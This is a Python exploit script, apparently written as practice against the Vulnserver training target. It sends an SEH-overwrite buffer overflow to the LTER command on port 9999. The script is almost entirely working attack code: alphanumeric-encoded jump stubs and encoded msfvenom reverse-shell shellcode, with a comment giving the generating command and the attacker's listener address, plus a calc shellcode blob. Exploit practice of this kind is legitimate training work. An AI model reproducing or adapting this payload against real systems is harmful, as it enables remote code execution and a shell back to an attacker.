#!/usr/bin/python

import sys
import socket
import random
import string
import struct

def pwned(_host, _port, _payload):
    print "[*] Conectandose a {0}:{1}...".format(_host, _port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((_host, _port))
    print "[*] Conectado, Enviando payload {0} bytes...".format(len(_payload))
    _payload = "{0}\r\n\r\n".format(_payload, _host)
    print _payload
    s.send(_payload)
    s.close
    print "[+] Payload de {0} bytes Enviado.".format(len(_payload))

def main():
  _host = "192.168.5.132"
  _port = 9999
  _offset_eip = 3518
  _nseh = struct.pack("<L",0x90900674) 
  _seh  = struct.pack("<L",0x6250160A) #625011BF pop ebx # pop ebx # retn essfunc.dll
  _espAdj = "\x54\x58\x66\x05\x4e\x13\x50\x5C" #0x13a6
  _backJump1 = ""
  _backJump1 += "\x25\x4A\x4D\x4E\x55"
  _backJump1 += "\x25\x35\x32\x31\x2A"
  _backJump1 += "\x05\x76\x40\x50\x50"
  _backJump1 += "\x05\x75\x40\x40\x40"
  _backJump1 += "\x50"
  _espAdj2 = "\x54\x58\x2c\x2b\x50\x5c"
  _backJump2 = ""
  _backJump2 += "\x54\x5B"
  _backJump2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
  _backJump2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
  _backJump2 += "\x05\x11\x11\x77\x62" ## add  eax, 0x62771111
  _backJump2 += "\x05\x11\x11\x66\x52" ## add  eax, 0x52661111
  _backJump2 += "\x05\x11\x11\x55\x62" ## add  eax, 0x62551111
  _backJump2 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
  _backJump2 += "\x50"                 ## push eax
  _backJump2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
  _backJump2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
  _backJump2 += "\x05\x41\x76\x53\x07" ## add  eax, 0x07537641
  _backJump2 += "\x05\x40\x75\x53\x06" ## add  eax, 0x06537540
  _backJump2 += "\x50"
  _break = 5000

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.5.137 LPORT=4444 -b '\x00' -f python -e x86/alpha_mixed BufferRegister=EBX -v _shellcode

  _shellcode =  ""
  _shellcode += "\x53\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49"
  _shellcode += "\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a"
  _shellcode += "\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
  _shellcode += "\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
  _shellcode += "\x58\x50\x38\x41\x42\x75\x4a\x49\x59\x6c\x6a"
  _shellcode += "\x48\x6e\x62\x47\x70\x77\x70\x35\x50\x43\x50"
  _shellcode += "\x6d\x59\x4a\x45\x34\x71\x39\x50\x55\x34\x4c"
  _shellcode += "\x4b\x30\x50\x44\x70\x4e\x6b\x62\x72\x74\x4c"
  _shellcode += "\x6c\x4b\x63\x62\x37\x64\x4c\x4b\x31\x62\x31"
  _shellcode += "\x38\x54\x4f\x6d\x67\x33\x7a\x55\x76\x46\x51"
  _shellcode += "\x79\x6f\x4e\x4c\x35\x6c\x53\x51\x51\x6c\x67"
  _shellcode += "\x72\x46\x4c\x31\x30\x6f\x31\x5a\x6f\x54\x4d"
  _shellcode += "\x73\x31\x68\x47\x59\x72\x69\x62\x73\x62\x30"
  _shellcode += "\x57\x4c\x4b\x72\x72\x56\x70\x6e\x6b\x43\x7a"
  _shellcode += "\x75\x6c\x4c\x4b\x42\x6c\x37\x61\x33\x48\x6b"
  _shellcode += "\x53\x51\x58\x77\x71\x6a\x71\x50\x51\x4e\x6b"
  _shellcode += "\x46\x39\x47\x50\x67\x71\x4e\x33\x6e\x6b\x72"
  _shellcode += "\x69\x72\x38\x68\x63\x44\x7a\x63\x79\x4c\x4b"
  _shellcode += "\x54\x74\x4c\x4b\x46\x61\x4b\x66\x66\x51\x49"
  _shellcode += "\x6f\x4e\x4c\x4a\x61\x78\x4f\x44\x4d\x63\x31"
  _shellcode += "\x68\x47\x47\x48\x79\x70\x73\x45\x6b\x46\x73"
  _shellcode += "\x33\x53\x4d\x6b\x48\x75\x6b\x63\x4d\x77\x54"
  _shellcode += "\x74\x35\x4d\x34\x63\x68\x4c\x4b\x46\x38\x44"
  _shellcode += "\x64\x35\x51\x68\x53\x31\x76\x6c\x4b\x74\x4c"
  _shellcode += "\x70\x4b\x6e\x6b\x62\x78\x65\x4c\x53\x31\x39"
  _shellcode += "\x43\x4c\x4b\x77\x74\x4c\x4b\x75\x51\x7a\x70"
  _shellcode += "\x4b\x39\x47\x34\x74\x64\x61\x34\x43\x6b\x43"
  _shellcode += "\x6b\x51\x71\x62\x79\x52\x7a\x36\x31\x4b\x4f"
  _shellcode += "\x39\x70\x51\x4f\x43\x6f\x51\x4a\x6c\x4b\x45"
  _shellcode += "\x42\x48\x6b\x4c\x4d\x73\x6d\x43\x58\x37\x43"
  _shellcode += "\x30\x32\x65\x50\x47\x70\x45\x38\x63\x47\x73"
  _shellcode += "\x43\x37\x42\x43\x6f\x51\x44\x70\x68\x62\x6c"
  _shellcode += "\x51\x67\x35\x76\x47\x77\x59\x6f\x7a\x75\x6f"
  _shellcode += "\x48\x4c\x50\x53\x31\x73\x30\x67\x70\x76\x49"
  _shellcode += "\x38\x44\x30\x54\x70\x50\x62\x48\x54\x69\x6b"
  _shellcode += "\x30\x72\x4b\x35\x50\x39\x6f\x4e\x35\x36\x30"
  _shellcode += "\x36\x30\x72\x70\x76\x30\x31\x50\x66\x30\x61"
  _shellcode += "\x50\x42\x70\x73\x58\x4a\x4a\x76\x6f\x4b\x6f"
  _shellcode += "\x39\x70\x39\x6f\x39\x45\x6a\x37\x71\x7a\x53"
  _shellcode += "\x35\x65\x38\x39\x50\x39\x38\x35\x55\x6d\x59"
  _shellcode += "\x71\x78\x64\x42\x37\x70\x76\x71\x61\x4c\x6b"
  _shellcode += "\x39\x4a\x46\x53\x5a\x36\x70\x66\x36\x32\x77"
  _shellcode += "\x32\x48\x6d\x49\x39\x35\x33\x44\x43\x51\x4b"
  _shellcode += "\x4f\x5a\x75\x4e\x65\x4b\x70\x61\x64\x46\x6c"
  _shellcode += "\x39\x6f\x52\x6e\x73\x38\x71\x65\x4a\x4c\x65"
  _shellcode += "\x38\x58\x70\x68\x35\x79\x32\x53\x66\x59\x6f"
  _shellcode += "\x38\x55\x42\x48\x30\x63\x72\x4d\x63\x54\x45"
  _shellcode += "\x50\x4f\x79\x38\x63\x56\x37\x56\x37\x46\x37"
  _shellcode += "\x55\x61\x4b\x46\x43\x5a\x57\x62\x32\x79\x33"
  _shellcode += "\x66\x79\x72\x79\x6d\x61\x76\x4a\x67\x51\x54"
  _shellcode += "\x75\x74\x57\x4c\x53\x31\x66\x61\x4e\x6d\x31"
  _shellcode += "\x54\x46\x44\x56\x70\x79\x56\x37\x70\x52\x64"
  _shellcode += "\x51\x44\x32\x70\x31\x46\x51\x46\x30\x56\x52"
  _shellcode += "\x66\x33\x66\x30\x4e\x42\x76\x36\x36\x63\x63"
  _shellcode += "\x46\x36\x31\x78\x50\x79\x4a\x6c\x67\x4f\x6d"
  _shellcode += "\x56\x59\x6f\x38\x55\x6c\x49\x39\x70\x72\x6e"
  _shellcode += "\x71\x46\x63\x76\x79\x6f\x34\x70\x71\x78\x33"
  _shellcode += "\x38\x4e\x67\x67\x6d\x75\x30\x39\x6f\x78\x55"
  _shellcode += "\x6d\x6b\x58\x70\x4f\x45\x6d\x72\x76\x36\x73"
  _shellcode += "\x58\x6e\x46\x6f\x65\x6f\x4d\x6d\x4d\x69\x6f"
  _shellcode += "\x49\x45\x77\x4c\x35\x56\x53\x4c\x37\x7a\x6d"
  _shellcode += "\x50\x69\x6b\x79\x70\x70\x75\x64\x45\x6f\x4b"
  _shellcode += "\x33\x77\x77\x63\x63\x42\x52\x4f\x61\x7a\x73"
  _shellcode += "\x30\x53\x63\x4b\x4f\x4e\x35\x41\x41"

  _calc = "33d2526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd7".decode("hex")
 
  _inject = "LTER ."
  _inject += "\x41" * 35
  #_inject += "\x54\x58\x66\x2d\xd1\x0d\x50\x5c"
  #_inject += "\x54\x58\x66\x2d\x6a\x0d\x50\x5c"
  _inject += "\x41" * 61
  _inject += _shellcode
  _inject += "\x41"*(3447 -35-61-len(_shellcode))
  _inject += _espAdj2
  _inject += _backJump2
  _inject += "A" * (_offset_eip - 3447 - len(_espAdj2) - len(_backJump2))
  _inject += _nseh
  _inject += _seh
  _inject += _espAdj
  _inject += _backJump1
  _inject += "D" * (_break - len(_inject))

  pwned(_host,_port,_inject)

if __name__ == "__main__":
	main()
